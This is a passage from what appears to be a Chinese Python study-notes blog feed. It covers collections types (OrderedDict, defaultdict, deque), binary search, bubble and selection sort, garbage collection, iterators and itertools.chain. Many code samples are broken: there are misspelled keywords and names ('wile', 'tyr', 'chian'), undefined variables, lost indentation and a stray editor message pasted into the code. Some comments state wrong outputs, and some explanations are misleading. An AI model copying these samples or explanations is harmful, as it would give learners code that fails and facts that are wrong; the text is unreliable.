inherited__">dict</span>):<br>    <span class="hljs-string">&#x27;Dictionary that remembers insertion order&#x27;</span><br>    <span class="hljs-keyword">pass</span><br><span class="hljs-comment"># 示例1：基本使用</span><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<br><br><span class="hljs-comment"># 初始化时可以传键值对参数</span><br>order_dict = OrderedDict(name=<span class="hljs-string">&quot;jack&quot;</span>, age=<span class="hljs-number">18</span>)<br><span class="hljs-built_in">print</span>(order_dict)<br><br><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> order_dict.items():<br>    <span class="hljs-built_in">print</span>(k, v)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-comment"># 也可以循环插入键值对</span><br>    order_dict[i] = i * <span class="hljs-number">10</span><br><br><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> order_dict.items():<br>    <span class="hljs-built_in">print</span>(k, v)<br>    <br><span class="hljs-comment"># 示例2：独有方法move_to_end()</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_to_end</span>(<span class="hljs-params">self, key, last=<span class="hljs-literal">True</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Move an existing element to the end (or beginning if last is false).</span><br><span class="hljs-string">    Raise KeyError if the element does not exist.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 将age这个key移动到最后</span><br>order_dict.move_to_end(<span class="hljs-string">&quot;age&quot;</span>)<br><span class="hljs-built_in">print</span>(order_dict.keys())<br></code></pre></td></tr></table></figure><p>python3.6之后的字典默认按照插入的先后顺序展示</p><h2 id="2-6-defaultdict-不会错误的字典"><a href="#2-6-defaultdict-不会错误的字典" class="headerlink" title="2.6 defaultdict  不会错误的字典"></a>2.6 defaultdict  不会错误的字典</h2><p>普通的字典访问不存在的键时会抛出keyError异常</p><p>defaultdict类型字典在访问不存在的key时不会异常，会返回default</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">示例<span class="hljs-number">1</span>：基本使用<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br><br>dd = defaultdict()<span class="hljs-comment"># 因为没有default_factory，所以此时dd和普通dict没有区别</span><br><br>dd = defaultdict(<span class="hljs-built_in">int</span>)<span class="hljs-comment"># default_factory为int</span><br>d[<span class="hljs-number">1</span>] = <span class="hljs-number">100</span><br><span class="hljs-built_in">print</span>(d[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(d[<span class="hljs-number">2</span>])<span class="hljs-comment"># 因为不存在2这个key，所以返回int的默认值，即0</span><br><br><br>dd = defaultdict(<span class="hljs-built_in">list</span>)<span class="hljs-comment"># default_factory为list</span><br><span class="hljs-built_in">print</span>(d[<span class="hljs-number">2</span>])<span class="hljs-comment"># 因为不存在2这个key，所以返回list的默认值，即[]</span><br>示例<span class="hljs-number">2</span>：default_factory可以为可调用对象<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">default_value</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">500</span><br><br><br>dd = defaultdict(default_value)<br>v1 = dd[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(v1)<br></code></pre></td></tr></table></figure><h2 id="2-7-deque-双向队列"><a href="#2-7-deque-双向队列" class="headerlink" title="2.7 deque 双向队列"></a>2.7 deque 双向队列</h2><p>deque双向队列（double-end queue）类似于list的容器</p><p>deque 可以快速的在队列的头部和尾部添加、删除元素</p><p>list只能在尾部追加，不可以从头部加元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">dq = deque()<br>dq.append(<span class="hljs-number">100</span>)<br>dq.appendleft(<span class="hljs-number">300</span>) <span class="hljs-comment"># 从左边加元素</span><br>dq.pop()<br>dq.popleft() <span class="hljs-comment"># 从左边弹出元素</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dq:<br>    <span class="hljs-built_in">print</span>(i)<br><br><span class="hljs-built_in">print</span>(dq.pop())<br><span class="hljs-built_in">print</span>(dq.popleft())<span class="hljs-comment"># 从左边弹出元素</span><br><br>dq.rotate(<span class="hljs-number">2</span>)            <span class="hljs-comment"># 把右边2个元素依次放在左边, 默认1，复数则相反方向</span><br><span class="hljs-comment"># 示例2：将可迭代对象变成双向队列</span><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br>ll = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br><br>dq = deque(ll)<br><span class="hljs-built_in">print</span>(dq.popleft())<br></code></pre></td></tr></table></figure><h2 id="2-8-二分查找"><a href="#2-8-二分查找" class="headerlink" title="2.8 二分查找"></a>2.8 二分查找</h2><ul><li>最简单的查找算法是遍历，但遍历的效率太低了。</li><li>二分查找（也叫折半查找）</li><li>二分查找的原理是，选择一个有序列表，确定最左边的值和最右边的值和最中间的位置值，比较待查元素和中间位置值，这样每次比较就可以排除一般的查找范围。</li><li>二分查找的前提是有序，特点是速度快，大数据查找的时候快一点</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实现方式： </span><br><span class="hljs-comment"># 1、定义最左侧和最右侧的下标，</span><br><span class="hljs-comment"># 2、开始循环，</span><br><span class="hljs-comment"># 3、定义 中间值的下标</span><br><span class="hljs-comment"># 4、如果中间值大于查找值，那么就缩小范围，最右侧结束下标变成中间值-1 </span><br><span class="hljs-comment"># 5、反之，如果中间值小于查找值，那么就缩小范围，最左侧下标变成中间值+1</span><br><span class="hljs-comment"># 返回 -1 查找到了，就返回-1，如果没找到会一直找，</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_target</span>(<span class="hljs-params">list_test ,target</span>):<br>    left = <span class="hljs-number">0</span><br>    right = <span class="hljs-built_in">len</span>(list_test)-<span class="hljs-number">1</span><br>    wile left&lt;=right:<br>        mid = (left+right)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> list_test[mid]==target:<br>            <span class="hljs-keyword">return</span> mid<br>        <span class="hljs-keyword">elif</span> list_test[mid]&gt;target:<br>            right=mid-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            left=mid+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>优点：简单，高效快速</p><p>缺点：要求被查列表必须有序、递归占用空间、不适合动态数据</p><p>应用场景：有序列表、静态数据、快速查找</p><h2 id="2-9-冒泡排序"><a href="#2-9-冒泡排序" class="headerlink" title="2.9 冒泡排序"></a>2.9 冒泡排序</h2><p>实现的逻辑：从第一个元素开始，逐个比对每一个元素，如果自己比对比的元素大，那么自己的索引就前进一个</p><p><img src="/./img/python/image-20220419211719385.png" alt="image-20220419211719385"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">1</span>, <span class="hljs-number">56</span>, <span class="hljs-number">65</span>, <span class="hljs-number">23</span>, <span class="hljs-number">12</span>, <span class="hljs-number">23</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>]<br><span class="hljs-built_in">print</span>(a)<br>l = <span class="hljs-built_in">len</span>(a) <span class="hljs-comment"># 10个元素，l就是10，但列表索引是0-9</span><br><span class="hljs-comment"># 第一层遍历列表的总长度</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,l): <span class="hljs-comment"># 注意，range里面第一个参为0时可不写,所以这里是0-10，就是i就是1-9</span><br>    <span class="hljs-comment"># 第二层，遍历列表的长度减去当前的位置减去1,比如说现在i是在1你range里面就是0-8</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,l-i-<span class="hljs-number">1</span>): <span class="hljs-comment"># l-i-1的目的是只需要遍历当前位置往后的位置上的数，不需要与当前位置往前的数作对比</span><br><span class="hljs-keyword">if</span> a[j]&gt;a[j+<span class="hljs-number">1</span>]: <span class="hljs-comment"># 如果当前位置比后面位置的大，就交换位置</span><br>a[j],a[j+<span class="hljs-number">1</span>]=a[j+<span class="hljs-number">1</span>],a[j]<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p>优点：简单易懂，稳定，<strong>原地排序，不会生成新的列表</strong>，不改变相等值的位置</p><p>缺点：性能差，不适合大规模数据排序</p><p>应用场景：小规模排序，</p><h2 id="2-10-选择排序"><a href="#2-10-选择排序" class="headerlink" title="2.10 选择排序"></a>2.10 选择排序</h2><p>实现逻辑：</p><p>1、找到数据中最小的元素，将这个元素与第一个元素交换位置</p><p>2、在剩下元素中找最小的元素，将这个元素与剩余元素中的第一个元素交换位置</p><p>3、循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">selection_sort</span>(<span class="hljs-params">list1</span>):<br>    n=<span class="hljs-built_in">len</span>(list1)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):<br>        min_index = i<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>,n):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">list</span>[j]&lt;list1[min_index]:<br>                min_index = j<br>        arr[i],arr[min_index]=arr[min_index],arr[i]<br></code></pre></td></tr></table></figure><p>【代码实现v2】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 参考冒泡排序的原地交换思路，实现原地交换的选择排序</span><br><span class="hljs-comment"># 首先默认min_index等于无序区第一个位置，如果后面位置上的数比默认位置上的数小，即重置最小数的位置，</span><br><span class="hljs-comment"># 这样每趟循环后，min_index都是无序区最小数的位置。</span><br><span class="hljs-comment"># 将无序区第一个位置的数和min_index上的数交换，实现原地交换</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">select_sort</span>(<span class="hljs-params">li</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(li) - <span class="hljs-number">1</span>):    <span class="hljs-comment"># i表示循环趟数</span><br>        min_index = i               <span class="hljs-comment"># 默认无序区的第一个位置上的元素最小，最为比较的参考对象</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(li)):    <span class="hljs-comment"># j比较的起始位置，可以从i+1开始，减少一次和自己比较的循环</span><br>            <span class="hljs-keyword">if</span> li[j] &lt; li[min_index]:<br>                min_index = j               <span class="hljs-comment"># 记录最小数的位置</span><br>        <span class="hljs-comment"># 一趟循环后，找到无序区最小数的位置，交换无序区第一个位置的数和无序区最小的数</span><br>        li[i], li[min_index] = li[min_index], li[i]<br></code></pre></td></tr></table></figure><h2 id="2-11-python内置排序算法"><a href="#2-11-python内置排序算法" class="headerlink" title="2.11 python内置排序算法"></a>2.11 python内置排序算法</h2><p>sort() 原地排序，不会生成新的数据，只对列表用</p><p>sorted() ，生成一份新数据，对所有可迭代对象都用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例1：基本使用</span><br>l1 = [<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>l2 = [<span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>]<br>l1.sort(reverse=<span class="hljs-literal">True</span>)<span class="hljs-comment"># reverse=True降序排</span><br><br>l2 = <span class="hljs-built_in">sorted</span>(l2)<br><span class="hljs-comment"># 示例2：高级用法</span><br><span class="hljs-comment"># key指定排序规则</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_sort</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x[<span class="hljs-string">&quot;id&quot;</span>]<br>ll.sort(key=my_sort)<br><span class="hljs-comment"># 匿名函数</span><br>ll = [&#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">3</span>&#125;]<br>ll.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;id&quot;</span>])<br><br>readonly option <span class="hljs-keyword">is</span> <span class="hljs-built_in">set</span> (add! tooverride)<br><span class="hljs-comment"># 按权重排序</span><br><span class="hljs-comment"># id=3排第一位，id=5排第二位， id=1排第三位</span><br>weights = &#123;<span class="hljs-number">3</span>: <span class="hljs-number">1</span>, <span class="hljs-number">5</span>: <span class="hljs-number">2</span>, <span class="hljs-number">1</span>: <span class="hljs-number">3</span>&#125;<br><br>ll.sort(key=<span class="hljs-keyword">lambda</span> x: weights[x[<span class="hljs-string">&quot;id&quot;</span>]])<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之基础回顾（一）</title>
    <link href="/2024/03/18/601python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/03/18/601python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1-基础回顾"><a href="#1-基础回顾" class="headerlink" title="1 基础回顾"></a>1 基础回顾</h1><h2 id="1-1变量赋值和引用"><a href="#1-1变量赋值和引用" class="headerlink" title="1.1变量赋值和引用"></a>1.1变量赋值和引用</h2><ul><li>当有一个新变量的时候，内存空间就会开辟一块数据存储</li><li>变量不同，地址是不同的，可以用id( )获取内存地址</li></ul><p>变量引用的本质就是将这个变量的内存地址，关联到一个新变量中，两个变量指向的是同一个地址，</p><p>所以变量是<strong>不占内存</strong>的，</p><h2 id="1-2-小整数池"><a href="#1-2-小整数池" class="headerlink" title="1.2 小整数池"></a>1.2 小整数池</h2><p>小整数池就是Python解释器在程序开始运行的时候就预先开辟的一块内存空间，存放一部分的整数，方便后面去调用，用于优化资源消耗的</p><h2 id="1-3-垃圾回收机制"><a href="#1-3-垃圾回收机制" class="headerlink" title="1.3 垃圾回收机制"></a>1.3 垃圾回收机制</h2><p>变量使用前需要先定义，定义就是开辟了空间，如果需要用到很多数据那么就会开辟很多空间，空间是有限的，开多了会造成浪费和溢出的风险，所以需要在使用后就释放这个空间，</p><p>python解释器自动的帮我们做了这个清理内存空间的机制，</p><p>采用的是<strong>引用计数</strong>的方式回收垃圾。</p><p>什么是垃圾？垃圾就是没有绑定变量名的值，也就是无法访问的值，就是没有用的值</p><p>如何回收垃圾？：通过引用计数的方式，就是当这个值被引用的时候，就会绑定到一个新的变量名上，引用计数就会加1 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><span class="hljs-comment"># x绑定给值10，10的引用计数=1</span><br>y = x<span class="hljs-comment"># y绑定给值10，10的引用计数=2</span><br>z = <span class="hljs-number">10</span>  <span class="hljs-comment"># z绑定给值10，10的引用计数=3</span><br><br><span class="hljs-comment"># 通过赋值可以将变量名绑定到值，将引用计数增加</span><br><span class="hljs-comment"># 通过del 方法可以将变量名和值解绑，将引用计数减少</span><br><br><span class="hljs-keyword">del</span> z <span class="hljs-comment"># z与它所绑定的值解绑，即值10的引用计数减为2</span><br><span class="hljs-comment"># 注意 del不是不是删除z的意思本质是接触变量名的绑定，内存回收的目的</span><br><br><span class="hljs-keyword">import</span> sys<br>sys.getrefcount(a)<span class="hljs-comment"># 查看引用计数</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    <span class="hljs-keyword">import</span> sys<br>    a = <span class="hljs-number">10</span><br>    <span class="hljs-built_in">print</span>(sys.getrefcount(a))<br>    b = a<br>    <span class="hljs-built_in">print</span>(sys.getrefcount(a))<br>    c = [a]<br>    <span class="hljs-built_in">print</span>(sys.getrefcount(a))<br>    <span class="hljs-keyword">del</span> b<br>    <span class="hljs-built_in">print</span>(sys.getrefcount(a))<br>    <span class="hljs-keyword">del</span> c<br>    <span class="hljs-built_in">print</span>(sys.getrefcount(a))<br></code></pre></td></tr></table></figure><p>拓展：py的垃圾回收机制，除了引用计数之外，还有【标记回收】、【分代回收】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 标记清除解决循环引用造成的问题</span><br>l1=[]<br>l2=[]<br>l1.append(l2)<br>l2.append(l1) <br><br><span class="hljs-keyword">del</span> l1, l2<br><br><span class="hljs-comment"># 分代回收解决引用计数效率低的问题</span><br></code></pre></td></tr></table></figure><h2 id="1-4-迭代器"><a href="#1-4-迭代器" class="headerlink" title="1.4 迭代器"></a>1.4 迭代器</h2><p>【可迭代对象(iterable)衣特伯】是啥？</p><p>指的是可以依次返回其内部成员的对象，比如字符串、列表、字典、文件等等都是可迭代的对象</p><p>【迭代器（iterator）衣特瑞儿】是啥？</p><p>内置函数__iter(可迭代对象)得到迭代器，本质上迭代器也是可迭代对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 可迭代对象，从语法上说就是那些具有__iter__的方法的对象</span><br><span class="hljs-comment"># 迭代器，从语法上说就是那些同事具有__next__和__iter__方法的对象。</span><br>- 迭代器调用__next__方法会调用迭代器中的下一个值；<br>- 迭代器调用__iter__方法返回迭代器本身；<br><span class="hljs-comment"># 示例：</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;  <span class="hljs-comment"># 可迭代对象s</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>i=<span class="hljs-built_in">iter</span>(s)  <span class="hljs-comment"># i是迭代器</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">next</span>(i)    <span class="hljs-comment"># 返回迭代器中下一个值</span><br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">next</span>(i)<br><span class="hljs-number">2</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">next</span>(i)<br><span class="hljs-number">3</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">next</span>(i)  <span class="hljs-comment">#抛出StopIteration的异常，代表无值可取，迭代结束</span><br></code></pre></td></tr></table></figure><p>优点：惰性取值；每次只取一个数据，不占内存</p><p>缺点：只能从前往后依次取值，不能返回头往前取值。就像象棋中的卒。只进不退</p><h2 id="1-5-for-循环的本质"><a href="#1-5-for-循环的本质" class="headerlink" title="1.5 for 循环的本质"></a>1.5 for 循环的本质</h2><p>while循环可以做循环遍历操作，但是远不如for 循环简洁实用。</p><p>while循环适合做条件循环，for 循环适合做迭代器循环</p><p>【for循环的本质】：for循环底层利用了迭代器的原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># while + iterator</span><br>goods = [<span class="hljs-string">&#x27;mac&#x27;</span>,<span class="hljs-string">&#x27;len&#x27;</span>,<span class="hljs-string">&#x27;huawei&#x27;</span>,<span class="hljs-string">&#x27;xiaomi&#x27;</span>]<br>goods_iterator = <span class="hljs-built_in">iter</span>(goods)<br><span class="hljs-keyword">while</span> ture:<br>    tyr:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(goods_iterator)) <span class="hljs-comment"># 无限循环依次取值</span><br>    <span class="hljs-keyword">except</span> StopIteration: <span class="hljs-comment"># 无限循环什么时候终止？捕捉异常终止循环</span><br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> goods:<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>for 循环底层实现分三步</p><p>第一：调用iter()，将goods转化成迭代器goods_iterator</p><p>第二： 调用next() 方法到迭代器goods_iterator取值</p><p>第三：循环调用第二步，直到捕捉到异常后终止循环</p><p>【for循环的好处】：为序列和非序列类型提供了一种统一的迭代取值的方式</p><h2 id="1-6-chain"><a href="#1-6-chain" class="headerlink" title="1.6 chain"></a>1.6 chain</h2><p>python官方提供了itertools工具包，方便操作迭代器，这个包里提供了chian函数，兼顾内存效率和写法优雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chian<br>a= [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]<br>b = [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">65</span>,<span class="hljs-number">56</span>]<br>c = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-number">4</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chain(a,b):<br>    <span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># 1, 2 ,3 ,4,5,4,5,65,56</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chain(a,c.values()):<br>    <span class="hljs-built_in">print</span>(i)   <span class="hljs-comment"># 1,2,3,4,5,1,4</span><br></code></pre></td></tr></table></figure><p>去除嵌套</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>a = [[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>],[<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chain(a):<br>    <span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># 1,2,3,4,5,6,7,8,9</span><br><span class="hljs-comment"># 取值</span><br>b = <span class="hljs-built_in">list</span>(chian(*a)) <span class="hljs-comment"># [1,2,3,4,5,6,7,8,9]</span><br><br></code></pre></td></tr></table></figure><h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 解嵌套、</span><br>a = [[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>]]<br>test1 = [m <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> i] <span class="hljs-comment"># [1, 2, 3, 3, 4, 5, 5, 6, 7]</span><br>test2 = <span class="hljs-built_in">list</span> (itertools.chian(*a)) <span class="hljs-comment"># [1, 2, 3, 3, 4, 5, 5, 6, 7]</span><br>test3 = <span class="hljs-built_in">sum</span>(a,start=[]) <span class="hljs-comment"># [1, 2, 3, 3, 4, 5, 5, 6, 7]</span><br><span class="hljs-comment"># 解嵌套、去重</span><br>test1 = <span class="hljs-built_in">list</span>(setm <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> i()) <span class="hljs-comment"># [1, 2, 3, 5, 8, 9]</span><br>test2 = <span class="hljs-built_in">list</span>(<span 